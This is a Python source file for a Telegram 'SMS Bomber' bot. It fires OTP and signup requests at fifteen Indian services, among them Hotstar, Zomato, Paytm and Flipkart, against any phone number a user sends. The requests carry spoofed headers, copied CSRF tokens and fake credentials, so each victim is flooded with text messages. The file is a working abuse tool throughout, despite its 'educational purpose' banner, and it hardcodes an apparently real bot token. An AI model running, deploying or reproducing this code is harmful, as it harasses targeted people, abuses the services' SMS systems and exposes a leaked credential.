import os
import random
import time
import requests
import logging
import re
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- Configuration ---
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8838617444:AAHUzG-DKVIalamCRc80-SjUT0cIR4_ZDKQ')

# --- SMS Bombing APIs (Same as Termux code) ---
def get_apis(target):
    """All working SMS APIs - exactly like Termux version"""
    apis = [
        # 1. Hotstar
        {
            'url': f'https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp',
            'method': 'PUT',
            'headers': {
                'Host': 'api.hotstar.com',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36',
                'x-hs-platform': 'PCTV',
                'x-country-code': 'IN',
                'x-hs-device-id': 'faa88f05-7432-4103-9886-7bd934f5c3a1',
                'hotstarauth': f'st={int(datetime.now().timestamp())}~exp={int(datetime.now().timestamp())+3600}~acl=/um/v3/*~hmac=dc2680f8d081c49647a2cfe43d4f67b015729c23514d944d46281373208e951d',
                'x-hs-appversion': '6.93.0',
                'x-request-id': 'faa88f05-7432-4103-9886-7bd934f5c3a1',
                'origin': 'https://www.hotstar.com',
                'referer': 'https://www.hotstar.com/',
            },
            'data': {"phone_number": target, "country_prefix": "91"}
        },
        # 2. Voot
        {
            'url': 'https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser',
            'method': 'POST',
            'headers': {
                'Host': 'us-central1-vootdev.cloudfunctions.net',
                'Content-Type': 'application/json;charset=UTF-8',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36',
                'Origin': 'https://www.voot.com',
                'Referer': 'https://www.voot.com/',
            },
            'data': {"type": "mobile", "mobile": target, "countryCode": "+91"}
        },
        # 3. SonyLIV
        {
            'url': 'https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP',
            'method': 'POST',
            'headers': {
                'Host': 'apiv2.sonyliv.com',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36',
                'app_version': '3.1.42.3',
                'device_id': '5836d9e1f6cb4f029bb44161b37c4fa0-1600956156120',
                'session_id': f'1b3e01a7268d4aff933446f020e2f3ab-{int(datetime.now().timestamp()*1000)}',
                'x-via-device': 'true',
                'origin': 'https://www.sonyliv.com',
            },
            'data': {
                "mobileNumber": target,
                "channelPartnerID": "MSMIND",
                "country": "IN",
                "timestamp": datetime.now().isoformat()
            }
        },
        # 4. Dream11
        {
            'url': 'https://www.dream11.com/graphql/mutation/pwa/register',
            'method': 'POST',
            'headers': {
                'Host': 'www.dream11.com',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36',
                'device': 'pwa',
                'x-csrf': 'fb1f1947-4547-392d-9a28-a9de30d9e766',
                'origin': 'https://www.dream11.com',
                'referer': 'https://www.dream11.com/register',
            },
            'data': {
                "query": "mutation register($email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation(email: $email mobileNumber: $mobileNumber password: $password site: $site) { message }}",
                "variables": {
                    "email": f"user{random.randint(1000,9999)}@gmail.com",
                    "mobileNumber": target,
                    "password": "Test@123456"
                }
            }
        },
        # 5. Zomato
        {
            'url': 'https://www.zomato.com/webroutes/auth/login',
            'method': 'POST',
            'headers': {
                'Host': 'www.zomato.com',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36',
                'x-zomato-csrft': 'a6b0c09972b2bdd30c9c1b6552caee5d',
                'origin': 'https://www.zomato.com',
                'referer': 'https://www.zomato.com/',
            },
            'data': {"country_id": 1, "phone": target, "verification_type": "sms", "method": "phone"}
        },
        # 6. Flipkart
        {
            'url': 'https://1.rome.api.flipkart.com/1/action/view',
            'method': 'POST',
            'headers': {
                'Host': '1.rome.api.flipkart.com',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36',
                'origin': 'https://www.flipkart.com',
                'referer': 'https://www.flipkart.com/login',
            },
            'data': {
                "actionRequestContext": {
                    "type": "LOGIN_IDENTITY_VERIFY",
                    "loginIdPrefix": "+91",
                    "loginId": target,
                    "loginType": "MOBILE",
                    "verificationType": "OTP",
                    "screenName": "LOGIN_V4_MOBILE",
                }
            }
        },
        # 7. Paytm
        {
            'url': 'https://accounts.paytm.com/v2/api/register',
            'method': 'POST',
            'headers': {
                'Host': 'accounts.paytm.com',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36',
                'origin': 'https://accounts.paytm.com',
            },
            'data': {
                "mobile": target,
                "email": f"user{random.randint(1000,9999)}@gmail.com",
                "scope": "paytm",
                "clientId": "paytm-web-secure",
                "loginPassword": "Test@123456",
            }
        },
        # 8. Swiggy
        {
            'url': 'https://www.swiggy.com/mapi/auth/signup',
            'method': 'POST',
            'headers': {
                'Host': 'www.swiggy.com',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36',
                'origin': 'https://www.swiggy.com',
                'referer': 'https://www.swiggy.com/auth/register',
            },
            'data': {
                "name": f"User{random.randint(1000,9999)}",
                "email": f"user{random.randint(1000,9999)}@gmail.com",
                "password": "Test@123456",
                "mobile": target,
            }
        },
        # 9. BookMyShow
        {
            'url': 'https://in.bookmyshow.com/pwa/api/uapi/otp/send',
            'method': 'POST',
            'headers': {
                'Host': 'in.bookmyshow.com',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36',
                'origin': 'https://in.bookmyshow.com',
                'referer': f'https://in.bookmyshow.com/login/otp?referer=/my-profile&phoneNumber={target}',
            },
            'data': {
                "channel": "phone",
                "subChannel": "sms",
                "details": {"phone": target, "origin": "https://in.bookmyshow.com"}
            }
        },
        # 10. BigBasket
        {
            'url': 'https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/',
            'method': 'POST',
            'headers': {
                'Host': 'www.bigbasket.com',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36',
                'x-channel': 'BB-PWA',
                'x-csrftoken': 'gHbsx6okji95qhYgKApxE9vPjHhYlpBkgVd73fh23WRxl9XfmikiznVB1Jy2X2ED',
                'origin': 'https://www.bigbasket.com',
                'referer': 'https://www.bigbasket.com/auth/login/',
            },
            'data': {"identifier": target}
        },
        # 11. Oyo Rooms
        {
            'url': 'https://www.oyorooms.com/api/pwa/generateotp?locale=en',
            'method': 'POST',
            'headers': {
                'Host': 'www.oyorooms.com',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36',
                'xsrf-token': 'vsnr5ksR-bduQ9oz3foaxbqjfoLSnVIzFzY0',
                'origin': 'https://www.oyorooms.com',
                'referer': 'https://www.oyorooms.com/login',
            },
            'data': {"phone": target, "country_code": "+91", "nod": 4}
        },
        # 12. Zee5
        {
            'url': f'https://b2bapi.zee5.com/device/sendotp_v1.php?phoneno={target}',
            'method': 'GET',
            'headers': {
                'Host': 'b2bapi.zee5.com',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36',
                'origin': 'https://www.zee5.com',
                'referer': 'https://www.zee5.com/',
            },
            'data': {}
        },
        # 13. AltBalaji
        {
            'url': 'https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN',
            'method': 'POST',
            'headers': {
                'Host': 'api.cloud.altbalaji.com',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36',
                'X-API-KEY': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ik1TalA5OXV4OGhLazFrS1UifQ.eyJwaG9uZV9udW1iZXIiOiI5NTE5ODc0NzA0IiwiY291bnRyeV9jb2RlIjoiOTEiLCJwbGF0Zm9ybSI6IndlYiIsImV4cCI6MTYwMzkxNTgyNjcxMH0.xpvhIZb9W-sLsITPKBusMKguK_2WzIioXJSwAjtzCnU',
                'origin': 'https://www.altbalaji.com',
                'referer': 'https://www.altbalaji.com/',
            },
            'data': {
                "phone_number": target,
                "country_code": "91",
                "platform": "web",
                "exp": int((datetime.now().timestamp() + 3600) * 1000)
            }
        },
        # 14. Grofers
        {
            'url': 'https://grofers.com/v2/accounts/',
            'method': 'POST',
            'headers': {
                'Host': 'grofers.com',
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36',
                'device_id': 'a11f656b-422e-4617-953b-c350d517467d',
                'auth_key': '57546838840176547788289acae69dd58e49de36b8d924c34e4310ec45824e13',
                'origin': 'https://grofers.com',
                'referer': 'https://grofers.com/',
            },
            'data': {'user_phone': target}
        },
        # 15. Lenskart
        {
            'url': 'https://api.lenskart.com/v2/customers/sendOtp',
            'method': 'POST',
            'headers': {
                'Host': 'api.lenskart.com',
                'Content-Type': 'application/json;charset=UTF-8',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36',
                'x-api-client': 'mobilesite',
                'origin': 'https://www.lenskart.com',
                'referer': 'https://www.lenskart.com/customer/account/login',
            },
            'data': {"telephone": target}
        }
    ]
    return apis

def send_sms(api_data):
    """Send SMS using API - same as Termux version"""
    try:
        if api_data['method'] == 'GET':
            response = requests.get(api_data['url'], headers=api_data['headers'], timeout=8)
        else:
            response = requests.post(
                api_data['url'], 
                headers=api_data['headers'],
                json=api_data['data'],
                timeout=8
            )
        return response.status_code in [200, 201, 202, 204]
    except Exception as e:
        logger.error(f"API Error: {e}")
        return False

# --- Telegram Bot Handlers ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/start command - Show welcome message"""
    keyboard = [
        [InlineKeyboardButton("📞 Send Number", switch_inline_query_current_chat="")],
        [InlineKeyboardButton("❓ Help", callback_data="help")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🔥 *SMS Bomber Bot Activated!*\n\n"
        "📌 *How to use:*\n"
        "1. Send a 10-digit phone number\n"
        "2. Wait for the bot to bomb\n"
        "3. Get results instantly\n\n"
        "⚠️ *For Educational Purpose Only*\n"
        "💀 Created by @DEVILRAHUL_OP",
        parse_mode='Markdown',
        reply_markup=reply_markup
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/help command"""
    await update.message.reply_text(
        "🤖 *SMS Bomber Bot Help*\n\n"
        "📱 *Commands:*\n"
        "/start - Start the bot\n"
        "/help - Show this help\n"
        "/status - Check bot status\n\n"
        "📞 *Sending a number:*\n"
        "Just type a 10-digit number like:\n"
        "`9876543210`\n\n"
        "⚡ *Features:*\n"
        "• 15+ Working APIs\n"
        "• High speed bombing\n"
        "• Real-time updates",
        parse_mode='Markdown'
    )

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/status command"""
    await update.message.reply_text(
        "🟢 *Bot Status:* Running\n"
        "📡 *APIs:* 15+\n"
        "🚀 *Speed:* High\n"
        "💀 *Created by:* @DEVILRAHUL_OP",
        parse_mode='Markdown'
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle phone number - MAIN BOMBING FUNCTION"""
    phone = update.message.text.strip()
    
    # Check if it's a valid phone number
    if not re.match(r'^[0-9]{10}$', phone):
        await update.message.reply_text(
            "❌ *Invalid Number!*\n\n"
            "Please send a 10-digit phone number.\n"
            "Example: `9876543210`",
            parse_mode='Markdown'
        )
        return
    
    # Send initial message
    msg = await update.message.reply_text(
        f"📱 *Bombing Started!*\n"
        f"🎯 Target: +91{phone}\n"
        f"⏳ Sending SMS to 15+ platforms...\n\n"
        f"⏱️ Please wait...",
        parse_mode='Markdown'
    )
    
    # Get all APIs
    apis = get_apis(phone)
    random.shuffle(apis)  # Shuffle for better results
    
    # Send SMS using all APIs
    success_count = 0
    failed_count = 0
    successful_services = []
    failed_services = []
    
    for i, api in enumerate(apis):
        if send_sms(api):
            success_count += 1
            # Extract service name from URL
            service = api['url'].split('/')[2].replace('www.', '').split('.')[0]
            successful_services.append(service.capitalize())
        else:
            failed_count += 1
            service = api['url'].split('/')[2].replace('www.', '').split('.')[0]
            failed_services.append(service.capitalize())
        
        # Update progress every 3 APIs
        if (i + 1) % 3 == 0:
            try:
                await msg.edit_text(
                    f"📱 *Bombing in Progress...*\n"
                    f"🎯 Target: +91{phone}\n"
                    f"✅ Successful: {success_count}\n"
                    f"❌ Failed: {failed_count}\n"
                    f"⏳ Progress: {i+1}/{len(apis)}",
                    parse_mode='Markdown'
                )
            except:
                pass
    
    # Final result
    result_text = (
        f"✅ *Bombing Complete!*\n\n"
        f"📞 Target: +91{phone}\n"
        f"📨 Total Attempts: {len(apis)}\n"
        f"✅ Successful: {success_count}\n"
        f"❌ Failed: {failed_count}\n\n"
    )
    
    if successful_services:
        result_text += f"🟢 *Successful:*\n`{', '.join(successful_services[:10])}`\n\n"
    
    result_text += "💀 *Created by @DEVILRAHUL_OP*\n"
    result_text += "⚠️ For Educational Purpose Only"
    
    await msg.edit_text(result_text, parse_mode='Markdown')

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()
    
    if query.data == "help":
        await query.edit_message_text(
            "🤖 *SMS Bomber Bot Help*\n\n"
            "📱 Just send a 10-digit phone number!\n"
            "Example: `9876543210`\n\n"
            "⚡ The bot will automatically:\n"
            "• Send OTP requests\n"
            "• Use 15+ platforms\n"
            "• Show real-time progress\n\n"
            "🔄 Send /start to restart",
            parse_mode='Markdown'
        )

# --- Main Bot ---

def main():
    """Start the bot"""
    if not BOT_TOKEN or BOT_TOKEN == 'YOUR_BOT_TOKEN_HERE':
        print("❌ Error: BOT_TOKEN not set!")
        print("Please set BOT_TOKEN environment variable.")
        return
    
    print("🤖 Starting Telegram SMS Bomber Bot...")
    print("🚀 Bot is running!")
    
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(CallbackQueryHandler(callback_handler))
    
    # Start polling
    app.run_polling()

if __name__ == '__main__':
    main()
